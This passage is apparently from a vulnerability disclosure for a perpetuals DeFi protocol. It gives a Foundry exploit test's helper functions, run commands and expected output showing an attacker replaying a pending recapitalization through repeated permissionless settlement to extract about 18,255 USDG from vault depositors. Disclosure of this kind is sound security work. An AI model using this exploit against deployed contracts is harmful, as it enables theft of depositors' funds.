    function _permissionlessRouterSettlement() private {
        bytes[] memory updateData = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(ATTACKER);
        router.settleLpEpoch(updateData);
    }

    function _advanceEntryMarkWithoutSettlement() private {
        _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(address(router));
        engine.updateMarkPrice(ENTRY_PRICE, uint64(block.timestamp));
    }

    function _queueFullBalanceRedeemEpochs(
        uint256 count
    ) private returns (uint256[] memory requestIds) {
        requestIds = new uint256[](count);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());

        uint256 previousRequestId;
        for (uint256 i; i < count; ++i) {
            address controller = address(uint160(0x100_000 + i));

            vm.prank(ATTACKER);
            juniorVault.transfer(controller, 1);

            vm.prank(controller);
            uint256 requestId = juniorVault.requestRedeem(1, controller, controller);
            assertGt(requestId, previousRequestId, "each request must occupy a distinct epoch");
            requestIds[i] = requestId;
            previousRequestId = requestId;

            vm.warp(block.timestamp + pool.LP_EPOCH_DURATION());
        }
    }

    function _reclaimControllerShares(
        uint256[] memory requestIds
    ) private {
        uint256 refundTime = block.timestamp;
        for (uint256 i; i < requestIds.length; ++i) {
            address controller = address(uint160(0x100_000 + i));
            vm.prank(controller);
            assertEq(
                juniorVault.claimRedeemRefund(requestIds[i], controller, controller),
                1,
                "each attacker controller must recover its zero-value queue atom"
            );
        }

        vm.warp(refundTime + juniorVault.DEPOSIT_COOLDOWN());
        for (uint256 i; i < requestIds.length; ++i) {
            address controller = address(uint160(0x100_000 + i));
            vm.prank(controller);
            juniorVault.transfer(ATTACKER, 1);
        }
    }

    function _positionSize(
        address account
    ) private view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _floorToAssetLot(
        uint256 assets
    ) private pure returns (uint256) {
        return (assets / ASSET_LOT) * ASSET_LOT;
    }

}
```

The constants above are action inputs (actors, deposits, prices, and queue length), not expected accounting outputs. Every expected entitlement, claim, available backing, replay transition, pending amount, revenue amount, attacker withdrawal, and attacked-versus-honest delta is read or derived from the resulting live protocol state.

### 3. Format and run

From the repository root:

```bash
cd packages/perps
forge fmt --check test/perps/accounting/waterfall/PendingRecapitalizationReplay.t.sol
forge test --match-path test/perps/accounting/waterfall/PendingRecapitalizationReplay.t.sol -vv
```

After the compiler has been installed once, the exact deterministic command used for the verification recorded below is:

```bash
forge test --offline --match-path test/perps/accounting/waterfall/PendingRecapitalizationReplay.t.sol -vv
```

Expected output:

```text
[PASS] test_RepeatedPermissionlessSettlementReusesRecapitalizationAndDivertsRealizedLosses()
Logs:
  Senior entitlement (USDG atoms): 101061808779
  Terminal physical assets (USDG atoms): 134158096590
  Terminal trader claim (USDG atoms): 191746480000
  First Senior credit (USDG atoms): 43473425369
  Pending recap after first settlement (USDG atoms): 57588383410
  Realized trading revenue (USDG atoms): 32554360000
  Attacked Senior principal (USDG atoms): 57588383410
  Attacked Junior principal (USDG atoms): 18439401959
  Attacker extracted USDG atoms: 18255961580
  Honest Senior principal (USDG atoms): 76027785369

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

USDG uses six decimals. The assertions prove every stage of the exploit: neither replay receives new pool cash or increases `accountedAssets`; the first replay sets the HWM and residual pending bucket to their exact corrupted values; the second replay clears pending while preserving the same physical backing; the honest execution leaves Junior at zero and sends all `32,554.36 USDG` of realized revenue to Senior; and the attacked execution assigns `18,439.401959 USDG` to Junior before transferring `18,255.961580 USDG` of that value into the attacker's wallet through the normal asynchronous redemption claim.

These instructions were rechecked from a clean checkout of commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` on 2026-11-08 with Forge `1.0.0-stable`. The clean run initialized all submodules, compiled 195 Solidity files with Solc `0.8.35`, passed `forge fmt --check`, and produced the one-test/zero-failure result above.

